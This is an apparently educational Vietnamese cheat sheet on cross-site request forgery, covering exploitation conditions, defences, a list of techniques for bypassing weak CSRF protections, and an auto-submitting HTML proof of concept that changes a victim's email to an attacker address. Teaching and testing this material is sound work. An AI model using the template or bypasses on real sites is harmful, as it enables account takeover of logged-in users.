# 🔄 Cross-Site Request Forgery (CSRF)

## 1. 📌 Tổng quan
CSRF là lỗ hổng cho phép kẻ tấn công lừa trình duyệt của nạn nhân thực hiện các hành động không mong muốn trên một ứng dụng web mà nạn nhân đã đăng nhập và xác thực trước đó.

### 3 Điều kiện để khai thác CSRF:
1. **Relevant Action:** Hành động có ý nghĩa quan trọng (đổi mật khẩu, đổi email, chuyển tiền, tạo tài khoản admin).
2. **Cookie-based Session Handling:** Phiên đăng nhập phụ thuộc hoàn toàn vào session cookie mà trình duyệt tự động đính kèm khi gửi request.
3. **No Unpredictable Parameters:** Không có tham số bí mật, khó đoán (như CSRF Token).

---

## 2. 💣 CSRF PoC HTML Template

```html
<!DOCTYPE html>
<html>
  <body>
    <h1>CSRF PoC</h1>
    <form id="csrfForm" action="https://vulnerable-website.com/email/change" method="POST">
      <input type="hidden" name="email" value="pwned@attacker.com" />
    </form>
    <script>
      document.getElementById('csrfForm').submit();
    </script>
  </body>
</html>
```

### Các kỹ thuật Bypass CSRF phòng thủ yếu:
- Bỏ hoàn toàn tham số `csrf` token trong request.
- Đổi HTTP Method từ `POST` sang `GET`.
- Sử dụng CSRF Token không gắn liền với session của người dùng (Token cố định hoặc lấy token của chính attacker đưa vào nạn nhân).
- Bypass kiểm tra header `Referer` (Referer validation regex bypass, bỏ Referer header qua thẻ `<meta name="referrer" content="never">`).
- Khai thác thuộc tính cookie `SameSite=Lax` sau 2 phút (Lax + POST window).

---

## 3. 🛡️ Biện pháp phòng chống (Mitigation)
1. **Anti-CSRF Tokens (Synchronizer Token Pattern):** Token ngẫu nhiên, bí mật, gắn với session người dùng và được kiểm tra nghiêm ngặt ở server.
2. **SameSite Cookie Attribute:** Đặt `SameSite=Strict` hoặc `SameSite=Lax` cho cookie session.
3. **Re-authentication:** Yêu cầu nhập lại mật khẩu cho các hành động nhạy cảm (đổi mật khẩu, đổi email).
